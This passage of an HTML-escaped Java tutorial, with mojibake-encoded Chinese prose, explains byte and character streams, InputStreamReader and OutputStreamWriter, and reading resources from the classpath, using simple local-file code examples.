&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®žé™…ä¸Šï¼Œç¼–è¯‘å™¨å¹¶ä¸ä¼šç‰¹åˆ«åœ°ä¸º&lt;code>InputStream&lt;/code>åŠ ä¸Šè‡ªåŠ¨å…³é—­ã€‚ç¼–è¯‘å™¨åªçœ‹&lt;code>try(resource = ...)&lt;/code>ä¸­çš„å¯¹è±¡æ˜¯å¦å®žçŽ°äº†&lt;code>java.lang.AutoCloseable&lt;/code>æŽ¥å£ï¼Œå¦‚æžœå®žçŽ°äº†ï¼Œå°±è‡ªåŠ¨åŠ ä¸Š&lt;code>finally&lt;/code>è¯­å¥å¹¶è°ƒç”¨&lt;code>close()&lt;/code>æ–¹æ³•ã€‚&lt;code>InputStream&lt;/code>å’Œ&lt;code>OutputStream&lt;/code>éƒ½å®žçŽ°äº†è¿™ä¸ªæŽ¥å£ï¼Œå› æ­¤éƒ½å¯ä»¥ç”¨åœ¨&lt;code>try(resource)&lt;/code>ä¸­&lt;/p>
&lt;ul>
&lt;li>&lt;code>InputStream&lt;/code>æä¾›äº†ä¸¤ä¸ªé‡è½½æ–¹æ³•æ¥æ”¯æŒè¯»å–å¤šä¸ªå­—èŠ‚&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>int read(byte[] b)ï¼šè¯»å–è‹¥å¹²å­—èŠ‚å¹¶å¡«å……åˆ°byte[]æ•°ç»„ï¼Œè¿”å›žè¯»å–çš„å­—èŠ‚æ•°
int read(byte[] b, int off, int len)ï¼šæŒ‡å®šbyte[]æ•°ç»„çš„åç§»é‡å’Œæœ€å¤§å¡«å……æ•°
&lt;/code>&lt;/pre>&lt;p>åˆ©ç”¨ä¸Šè¿°æ–¹æ³•ä¸€æ¬¡è¯»å–å¤šä¸ªå­—èŠ‚æ—¶ï¼Œéœ€è¦å…ˆå®šä¹‰ä¸€ä¸ª&lt;code>byte[]&lt;/code>æ•°ç»„ä½œä¸ºç¼“å†²åŒºï¼Œ&lt;code>read()&lt;/code>æ–¹æ³•ä¼šå°½å¯èƒ½å¤šåœ°è¯»å–å­—èŠ‚åˆ°ç¼“å†²åŒºï¼Œ ä½†ä¸ä¼šè¶…è¿‡ç¼“å†²åŒºçš„å¤§å°ã€‚&lt;code>read()&lt;/code>æ–¹æ³•çš„è¿”å›žå€¼ä¸å†æ˜¯å­—èŠ‚çš„&lt;code>int&lt;/code>å€¼ï¼Œè€Œæ˜¯è¿”å›žå®žé™…è¯»å–äº†å¤šå°‘ä¸ªå­—èŠ‚ã€‚å¦‚æžœè¿”å›ž&lt;code>-1&lt;/code>ï¼Œè¡¨ç¤ºæ²¡æœ‰æ›´å¤šçš„æ•°æ®äº†&lt;/p>
&lt;p>åˆ©ç”¨ç¼“å†²åŒºä¸€æ¬¡è¯»å–å¤šä¸ªå­—èŠ‚çš„ä»£ç å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å®šä¹‰1000ä¸ªå­—èŠ‚å¤§å°çš„ç¼“å†²åŒº:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">1000&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// è¯»å–åˆ°ç¼“å†²åŒº
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;read &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; bytes.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>é™¤&lt;code>FileInputStream&lt;/code>ä»¥å¤–è¿˜æœ‰&lt;code>ByteArrayInputStream&lt;/code>å¯ä»¥åœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿä¸€ä¸ª&lt;code>InputStream&lt;/code>ï¼Œå®žé™…ä¸Šæ˜¯æŠŠä¸€ä¸ª&lt;code>byte[]&lt;/code>æ•°ç»„åœ¨å†…å­˜ä¸­å˜æˆä¸€ä¸ª&lt;code>InputStream&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">72&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">101&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">108&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">108&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">111&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">33&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>OutputStream&lt;/code>è¿˜æä¾›äº†ä¸€ä¸ª&lt;code>flush()&lt;/code>æ–¹æ³•ï¼Œå®ƒçš„ç›®çš„æ˜¯å°†ç¼“å†²åŒºçš„å†…å®¹çœŸæ­£è¾“å‡ºåˆ°ç›®çš„åœ°&lt;/li>
&lt;/ul>
&lt;h3 id="å­—ç¬¦æµè¯»å†™">å­—ç¬¦æµè¯»å†™&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">InputStream&lt;/th>
&lt;th style="text-align:left">Reader&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">å­—èŠ‚æµï¼Œä»¥&lt;code>byte&lt;/code>ä¸ºå•ä½&lt;/td>
&lt;td style="text-align:left">å­—ç¬¦æµï¼Œä»¥&lt;code>char&lt;/code>ä¸ºå•ä½&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">è¯»å–å­—èŠ‚ï¼ˆ-1ï¼Œ0~255ï¼‰ï¼š&lt;code>int read()&lt;/code>&lt;/td>
&lt;td style="text-align:left">è¯»å–å­—ç¬¦ï¼ˆ-1ï¼Œ0~65535ï¼‰ï¼š&lt;code>int read()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">è¯»åˆ°å­—èŠ‚æ•°ç»„ï¼š&lt;code>int read(byte[] b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">è¯»åˆ°å­—ç¬¦æ•°ç»„ï¼š&lt;code>int read(char[] c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>é™¤äº†ç‰¹æ®Šçš„&lt;code>CharArrayReader&lt;/code>å’Œ&lt;code>StringReader&lt;/code>ï¼Œæ™®é€šçš„&lt;code>Reader&lt;/code>å®žé™…ä¸Šæ˜¯åŸºäºŽ&lt;code>InputStream&lt;/code>æž„é€ çš„ï¼Œå› ä¸º&lt;code>Reader&lt;/code>éœ€è¦ä»Ž&lt;code>InputStream&lt;/code>ä¸­è¯»å…¥å­—èŠ‚æµï¼ˆ&lt;code>byte&lt;/code>ï¼‰ï¼Œç„¶åŽï¼Œæ ¹æ®ç¼–ç è®¾ç½®ï¼Œå†è½¬æ¢ä¸º&lt;code>char&lt;/code>å°±å¯ä»¥å®žçŽ°å­—ç¬¦æµã€‚å¦‚æžœæˆ‘ä»¬æŸ¥çœ‹&lt;code>FileReader&lt;/code>çš„æºç ï¼Œå®ƒåœ¨å†…éƒ¨å®žé™…ä¸ŠæŒæœ‰ä¸€ä¸ª&lt;code>FileInputStream&lt;/code>ã€‚&lt;/p>
&lt;p>æ—¢ç„¶&lt;code>Reader&lt;/code>æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŸºäºŽ&lt;code>InputStream&lt;/code>çš„&lt;code>byte&lt;/code>åˆ°&lt;code>char&lt;/code>çš„è½¬æ¢å™¨ï¼Œé‚£ä¹ˆï¼Œå¦‚æžœæˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ª&lt;code>InputStream&lt;/code>ï¼Œæƒ³æŠŠå®ƒè½¬æ¢ä¸º&lt;code>Reader&lt;/code>ï¼Œæ˜¯å®Œå…¨å¯è¡Œçš„ã€‚&lt;code>InputStreamReader&lt;/code>å°±æ˜¯è¿™æ ·ä¸€ä¸ªè½¬æ¢å™¨ï¼Œå®ƒå¯ä»¥æŠŠä»»ä½•&lt;code>InputStream&lt;/code>è½¬æ¢ä¸º&lt;code>Reader&lt;/code>ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŒæœ‰InputStream:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å˜æ¢ä¸ºReader:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Reader&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;UTF-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æž„é€ &lt;code>InputStreamReader&lt;/code>æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥&lt;code>InputStream&lt;/code>ï¼Œè¿˜éœ€è¦æŒ‡å®šç¼–ç ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ª&lt;code>Reader&lt;/code>å¯¹è±¡ã€‚ä¸Šè¿°ä»£ç å¯ä»¥é€šè¿‡&lt;code>try (resource)&lt;/code>æ›´ç®€æ´åœ°æ”¹å†™å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Reader&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;UTF-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šè¿°ä»£ç å®žé™…ä¸Šå°±æ˜¯&lt;code>FileReader&lt;/code>çš„ä¸€ç§å®žçŽ°æ–¹å¼ã€‚&lt;/p>
&lt;p>ä½¿ç”¨&lt;code>try (resource)&lt;/code>ç»“æž„æ—¶ï¼Œå½“æˆ‘ä»¬å…³é—­&lt;code>Reader&lt;/code>æ—¶ï¼Œå®ƒä¼šåœ¨å†…éƒ¨è‡ªåŠ¨è°ƒç”¨&lt;code>InputStream&lt;/code>çš„&lt;code>close()&lt;/code>æ–¹æ³•ï¼Œæ‰€ä»¥ï¼Œåªéœ€è¦å…³é—­æœ€å¤–å±‚çš„&lt;code>Reader&lt;/code>å¯¹è±¡å³å¯&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">OutputStream&lt;/th>
&lt;th style="text-align:left">Writer&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">å­—èŠ‚æµï¼Œä»¥&lt;code>byte&lt;/code>ä¸ºå•ä½&lt;/td>
&lt;td style="text-align:left">å­—ç¬¦æµï¼Œä»¥&lt;code>char&lt;/code>ä¸ºå•ä½&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">å†™å…¥å­—èŠ‚ï¼ˆ0~255ï¼‰ï¼š&lt;code>void write(int b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">å†™å…¥å­—ç¬¦ï¼ˆ0~65535ï¼‰ï¼š&lt;code>void write(int c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">å†™å…¥å­—èŠ‚æ•°ç»„ï¼š&lt;code>void write(byte[] b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">å†™å…¥å­—ç¬¦æ•°ç»„ï¼š&lt;code>void write(char[] c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">æ— å¯¹åº”æ–¹æ³•&lt;/td>
&lt;td style="text-align:left">å†™å…¥Stringï¼š&lt;code>void write(String s)&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>é™¤äº†&lt;code>CharArrayWriter&lt;/code>å’Œ&lt;code>StringWriter&lt;/code>å¤–ï¼Œæ™®é€šçš„Writerå®žé™…ä¸Šæ˜¯åŸºäºŽ&lt;code>OutputStream&lt;/code>æž„é€ çš„ï¼Œå®ƒæŽ¥æ”¶&lt;code>char&lt;/code>ï¼Œç„¶åŽåœ¨å†…éƒ¨è‡ªåŠ¨è½¬æ¢æˆä¸€ä¸ªæˆ–å¤šä¸ª&lt;code>byte&lt;/code>ï¼Œå¹¶å†™å…¥&lt;code>OutputStream&lt;/code>ã€‚å› æ­¤ï¼Œ&lt;code>OutputStreamWriter&lt;/code>å°±æ˜¯ä¸€ä¸ªå°†ä»»æ„çš„&lt;code>OutputStream&lt;/code>è½¬æ¢ä¸º&lt;code>Writer&lt;/code>çš„è½¬æ¢å™¨ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>try (Writer writer = new OutputStreamWriter(new FileOutputStream(&amp;#34;readme.txt&amp;#34;), &amp;#34;UTF-8&amp;#34;)) {
// TODO:
}
&lt;/code>&lt;/pre>&lt;p>ä¸Šè¿°ä»£ç å®žé™…ä¸Šå°±æ˜¯&lt;code>FileWriter&lt;/code>çš„ä¸€ç§å®žçŽ°æ–¹å¼ï¼Œè¿™å’Œä¸Šé¢çš„&lt;code>InputStreamReader&lt;/code>æ˜¯ä¸€æ ·çš„&lt;/p>
&lt;h3 id="filteræ¨¡å¼">Filteræ¨¡å¼&lt;/h3>
&lt;p>Filteræ¨¡å¼å¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€å¢žåŠ åŠŸèƒ½ï¼Œåˆç§°Decoratoræ¨¡å¼&lt;/p>
&lt;h3 id="classpath">classpath&lt;/h3>
&lt;p>ä»Žclasspathè¯»å–æ–‡ä»¶å°±å¯ä»¥é¿å…ä¸åŒçŽ¯å¢ƒä¸‹æ–‡ä»¶è·¯å¾„ä¸ä¸€è‡´çš„é—®é¢˜ï¼Œåœ¨classpathä¸­çš„èµ„æºæ–‡ä»¶ï¼Œè·¯å¾„æ€»æ˜¯ä»¥&lt;code>ï¼&lt;/code>å¼€å¤´ï¼Œæˆ‘ä»¬å…ˆèŽ·å–å½“å‰çš„&lt;code>Class&lt;/code>å¯¹è±¡ï¼Œç„¶åŽè°ƒç”¨&lt;code>getResourceAsStream()&lt;/code>å°±å¯ä»¥ç›´æŽ¥ä»Žclasspathè¯»å–ä»»æ„çš„èµ„æºæ–‡ä»¶ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getResourceAsStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è°ƒç”¨&lt;code>getResourceAsStream()&lt;/code>éœ€è¦ç‰¹åˆ«æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œå¦‚æžœèµ„æºæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå®ƒå°†è¿”å›ž&lt;code>null&lt;/code>ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ£€æŸ¥è¿”å›žçš„&lt;code>InputStream&lt;/code>æ˜¯å¦ä¸º&lt;code>null&lt;/code>ï¼Œå¦‚æžœä¸º&lt;code>null&lt;/code>ï¼Œè¡¨ç¤ºèµ„æºæ–‡ä»¶åœ¨classpathä¸­æ²¡æœ‰æ‰¾åˆ°ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getResourceAsStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æžœæˆ‘ä»¬æŠŠé»˜è®¤çš„é…ç½®æ”¾åˆ°jaråŒ…ä¸­ï¼Œå†ä»Žå¤–éƒ¨æ–‡ä»¶ç³»ç»Ÿè¯»å–ä¸€ä¸ªå¯é€‰çš„é…ç½®æ–‡ä»¶ï¼Œå°±å¯ä»¥åšåˆ°æ—¢æœ‰é»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œåˆå¯ä»¥è®©ç”¨æˆ·è‡ªå·±ä¿®æ”¹é…ç½®ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Properties&lt;/span> &lt;span style="color:#111">props&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Properties&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">props&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">load&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStreamFromClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">props&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">load&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStreamFromFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./conf.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ ·è¯»å–é…ç½®æ–‡ä»¶ï¼Œåº”ç”¨ç¨‹åºå¯åŠ¨å°±æ›´åŠ çµæ´»&lt;/p>
&lt;h3 id="åºåˆ—åŒ–ååºåˆ—åŒ–">åºåˆ—åŒ–&amp;amp;ååºåˆ—åŒ–&lt;/h3>
